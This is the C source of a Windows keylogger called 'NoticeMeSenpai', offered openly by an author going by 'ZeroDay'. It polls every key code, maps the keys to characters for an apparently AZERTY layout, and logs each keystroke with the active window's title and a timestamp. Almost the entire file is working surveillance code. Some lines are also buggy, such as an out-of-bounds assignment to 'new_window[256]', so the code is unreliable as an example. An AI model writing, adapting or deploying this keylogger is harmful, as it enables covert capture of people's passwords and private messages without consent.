
/* 
 * Program name: NoticeMeSenpai
 * Author: ZeroDay
 * About: Keylogger with active windows detection
 *        User may distribute and modify source code but MUST keep this top commented section in the source code!
 * I will NOT be held responsible for anything silly you may do with this!
 * Created on 15 mai 2017, 15:56
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
#include <time.h>

int main()
{
    //Time
    time_t timer;
    char buffer[26];
    struct tm* tm_info;
    time(&timer);
    tm_info = localtime(&timer);
    strftime(buffer, 26, "%Y-%m-%d", tm_info);
    //Keylogging
    SHORT i;
    SHORT keyLastState = -1, keyCurrentState;
    int isCapsLock;
    
    //Active windows
    char window[256]= "hello";
    char new_window[256] = "hello";
    HWND handle = GetForegroundWindow();
    GetWindowText(handle, window, 256);
  
    //Let's go
    printf("****NoticeMeSenpai****");
    while(1){
        Sleep(20);
        HWND handle = GetForegroundWindow();
        GetWindowText(handle, window, 256);
        time(&timer);
        tm_info = localtime(&timer);
        strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);
        if(strcmp(window, new_window)) {
            printf("\n");
            strcpy(new_window,window);
            if( !strcmp(window, new_window) && strcmp(window, "")) {
                 printf("\nActive: %s --- %s\n", new_window,buffer);
                 fflush(stdout);
                 //While window and new_window are the same
                 while(!strcmp(window, new_window)) {
                    Sleep(20);
                    HWND handle = GetForegroundWindow();
                    GetWindowText(handle, window, 256);
                    //strcpy(new_window,window);
                    for(i = 0; i <= 256; i++) {
                        if(GetAsyncKeyState(i) == -32767) {
                                            keyCurrentState = (GetKeyState(VK_CAPITAL) & 1);
                                            if (keyCurrentState != keyLastState){
                                                keyLastState = keyCurrentState;
                                                    if (keyCurrentState!=0){
                                                        isCapsLock = 1;
                                                       /* printf("[CapsLock is ON]\n");
                                                        file=fopen("key.printf","a+");
                                                        fprintf(file,"%s","\n[CapsLock is ON]");
                                                        fclose(file);
                                                        fflush(stdout);*/
                                                    }else{
                                                        isCapsLock = 0;
                                                       /* printf("[CapsLock is OFF]\n");
                                                        file=fopen("key.printf","a+");
                                                        fprintf(file,"%s","\n[CapsLock is OFF]");
                                                        fclose(file);
                                                        fflush(stdout);*/
                                                    }
                                            } 

                                            if((i>=39)&&(i<=64)){
                                                if(isCapsLock==0) {
                                                        printf("%c", i);
                                                        break;
                                                }
                                            }
                                             //a-z
                                            else if((i>64)&&(i<91)){ 
                                                if(isCapsLock==0) {
                                                        i+=32;
                                                        printf("%c", i);
                                                        break;
                                                } else {
                                                        printf("%c", i);
                                                        break;
                                                }
                                            }
                                            else {
                                           setvbuf (stdout, NULL, _IONBF, 0);
                                                switch(i) {
                                                   /* case VK_LBUTTON:
                                                                printf("[LClick]");
                                                                break;
                                                    case VK_RBUTTON:
                                                                printf("[RClick]");
                                                                break;*/
                                                    case VK_CANCEL:
                                                                printf("[Cancel]");
                                                                break;
                                                    case VK_SPACE:
                                                                printf(" ");
                                                                break;
                                                    case VK_LCONTROL:
                                                                printf("[LCtrl]");
                                                                break;
                                                    case VK_RCONTROL:
                                                                printf("[RCtrl]");
                                                                break;
                                                    case VK_LMENU:
                                                                printf("[LAlt]");
                                                                break;
                                                    case VK_RMENU:
                                                                printf("[RAlt]");
                                                                break;
                                                    case VK_LWIN:
                                                                printf("[LWindows]");
                                                                break;
                                                    case VK_RWIN:
                                                                printf("[RWindows]");
                                                                break;
                                                    case VK_APPS:
                                                        printf("[Applications]");
                                                        break;
                                                    case VK_SNAPSHOT:
                                                        printf("[PrintScreen]");
                                                        break;
                                                    case VK_INSERT:
                                                        printf("[Insert]");
                                                        break;
                                                    case VK_PAUSE:
                                                        printf("[Pause]");
                                                        break;
                                                    case VK_VOLUME_MUTE:
                                                        printf("[VolumeMute]");
                                                        break;
                                                    case VK_VOLUME_DOWN:
                                                        printf("[VolumeDown]");
                                                        break;
                                                    case VK_VOLUME_UP:
                                                        printf("[VolumeUp]");
                                                        break;
                                                    case VK_SELECT:
                                                        printf("[Select]");
                                                        break;
                                                    case VK_HELP:
                                                        printf("[Help]");
                                                        break;
                                                    case VK_EXECUTE:
                                                        printf("[Execute]");
                                                        break;
                                                    case VK_DELETE:
                                                        printf("[Delete]");
                                                        break;
                                                    case VK_CLEAR:
                                                        printf("[Clear]");
                                                        break;
                                                    case VK_RETURN:
                                                        printf("[Enter]");
                                                        break;
                                                    case VK_BACK:
                                                        printf("[Backspace]");
                                                        break;
                                                    case VK_TAB:
                                                        printf("[Tab]");
                                                        break;
                                                    case VK_ESCAPE:
                                                        printf("[Escape]");
                                                        break;
                                                    case VK_LSHIFT:
                                                        printf("[LShift]");
                                                        break;
                                                    case VK_RSHIFT:
                                                        printf("[RShift]");
                                                        break;
                                                    case VK_NUMLOCK:
                                                        printf("[NumLock]");
                                                        break;
                                                    case VK_SCROLL:
                                                        printf("[ScrollLock]");
                                                        break;
                                                    case VK_HOME:
                                                        printf("[Home]");
                                                        break;
                                                    case VK_END:
                                                        printf("[End]");
                                                        break;
                                                    case VK_PLAY:
                                                        printf("[Play]");
                                                        break;
                                                    case VK_ZOOM:
                                                        printf("[Zoom]");
                                                        break;
                                                    case VK_DIVIDE:
                                                        printf("[/]");
                                                        break;
                                                    case VK_MULTIPLY:
                                                        printf("[*]");
                                                        break;
                                                    case VK_SUBTRACT:
                                                        printf("[-]");
                                                        break;
                                                    case VK_ADD:
                                                        printf("[+]");
                                                        break;
                                                    case VK_PRIOR:
                                                        printf("[PageUp]");
                                                        break;
                                                    case VK_NEXT:
                                                        printf("[PageDown]");
                                                        break;
                                                    case VK_LEFT:
                                                        printf("[LArrow]");
                                                        break;
                                                    case VK_RIGHT:
                                                        printf("[RArrow]");
                                                        break;
                                                    case VK_UP:
                                                        printf("[UpArrow]");
                                                        break;
                                                    case VK_DOWN:
                                                        printf("[DownArrow]");
                                                        break;
                                                    case VK_NUMPAD0:
                                                        printf("[0]");
                                                        break;
                                                    case VK_NUMPAD1:
                                                        printf("[1]");
                                                        break;
                                                    case VK_NUMPAD2:
                                                        printf("[2]");
                                                        break;
                                                    case VK_NUMPAD3:
                                                        printf("[3]");
                                                        break;
                                                    case VK_NUMPAD4:
                                                        printf("[4]");
                                                        break;
                                                    case VK_NUMPAD5:
                                                        printf("[5]");
                                                        break;
                                                    case VK_NUMPAD6:
                                                        printf("[6]");
                                                        break;
                                                    case VK_NUMPAD7:
                                                        printf("[7]");
                                                        break;
                                                    case VK_NUMPAD8:
                                                        printf("[8]");
                                                        break;
                                                    case VK_NUMPAD9:
                                                        printf("[9]");
                                                        break;
                                                    case VK_F1:
                                                        printf("[F1]");
                                                        break;
                                                    case VK_F2:
                                                        printf("[F2]");
                                                        break;
                                                    case VK_F3:
                                                        printf("[F3]");
                                                        break;
                                                    case VK_F4:
                                                        printf("[F4]");
                                                        break;
                                                    case VK_F5:
                                                        printf("[F5]");
                                                        break;
                                                    case VK_F6:
                                                        printf("[F6]");
                                                        break;
                                                    case VK_F7:
                                                        printf("[F7]");
                                                        break;
                                                    case VK_F8:
                                                        printf("[F8]");
                                                        break;
                                                    case VK_F9:
                                                        printf("[F9]");
                                                        break;
                                                    case VK_F10:
                                                        printf("[F10]");
                                                        break;
                                                    case VK_F11:
                                                        printf("[F11]");
                                                        break;
                                                    case VK_F12:
                                                        printf("[F12]");
                                                        break;
                                                    case VK_F13:
                                                        printf("[F13]");
                                                        break;
                                                    case VK_F14:
                                                        printf("[F14]");
                                                        break;
                                                    case VK_F15:
                                                        printf("[F15]");
                                                        break;
                                                    case VK_F16:
                                                        printf("[F16]");
                                                        break;
                                                    case VK_F17:
                                                        printf("[F17]");
                                                        break;
                                                    case VK_F18:
                                                        printf("[F18]");
                                                        break;
                                                    case VK_F19:
                                                        printf("[F19]");
                                                        break;
                                                    case VK_F20:
                                                        printf("[F20]");
                                                        break;
                                                    case VK_F21:
                                                        printf("[F21]");
                                                        break;
                                                    case VK_F22:
                                                        printf("[F22]");
                                                        break;
                                                    case VK_F23:
                                                        printf("[F23]");
                                                        break;
                                                    case VK_F24:
                                                        printf("[F24]");
                                                        break;
                                                    case VK_OEM_2:
                                                        if (GetAsyncKeyState(VK_SHIFT))
                                                            printf("/");
                                                        else
                                                            printf(":");
                                                        break;
                                                    case VK_OEM_3:
                                                        if (GetAsyncKeyState(VK_SHIFT))
                                                            printf("%%");
                                                        else
                                                            printf("ù");
                                                        break;
                                                    case VK_OEM_4:
                                                        if (GetAsyncKeyState(VK_SHIFT))
                                                            printf("{");
                                                        else
                                                            printf(")");
                                                        break;
                                                    case VK_OEM_5:
                                                        if (GetAsyncKeyState(VK_SHIFT))
                                                            printf("µ");
                                                        else
                                                            printf("*");
                                                        break;
                                                    case VK_OEM_6:
                                                        if (GetAsyncKeyState(VK_SHIFT))
                                                            printf("}");
                                                        else
                                                            printf("");
                                                        break;
                                                    case VK_OEM_7:
                                                        if (GetAsyncKeyState(VK_SHIFT))
                                                            printf("µ");
                                                        else
                                                            printf("*");
                                                        break;
                                                        break;
                                                    case 0xBC:                //comma
                                                        if (GetAsyncKeyState(VK_SHIFT))
                                                            printf("?");
                                                        else
                                                            printf(",");
                                                        break;
                                                    case 0xBE:              //Period
                                                        if (GetAsyncKeyState(VK_SHIFT))
                                                            printf(".");
                                                        else
                                                            printf(";");
                                                        break;
                                                    case 0xBA:              //Semi Colon same as VK_OEM_1
                                                        if (GetAsyncKeyState(VK_SHIFT))
                                                            printf("£");
                                                        else
                                                            printf("$");
                                                        break;
                                                    case 0xBD:              //Minus
                                                        if (GetAsyncKeyState(VK_SHIFT))
                                                            printf("_");
                                                        else
                                                            printf("-");
                                                        break;
                                                    case 0xBB:              //Equal
                                                        if (GetAsyncKeyState(VK_SHIFT))
                                                            printf("+");
                                                        else
                                                            printf("=");
                                                        break;

                                                    default:
                                                        /*if(GetAsyncKeyState(VK_SHIFT) || GetAsyncKeyState(VK_MENU) ) {

                                                        } else if (GetAsyncKeyState(VK_LBUTTON) || GetAsyncKeyState(VK_RBUTTON)) {
                                                        } else {
                                                    printf("%c", i);*/
                                                    fflush(stdout);
                                                    break;}
                                                }


                                        }
                                    }
                }
            }
            else {
            
            }
        } else {
            /* As new_window is now different from window, we change new_window value and
             * it redirects us to the first if statement
             */
            new_window[256] = "hello";
        }
    }
}

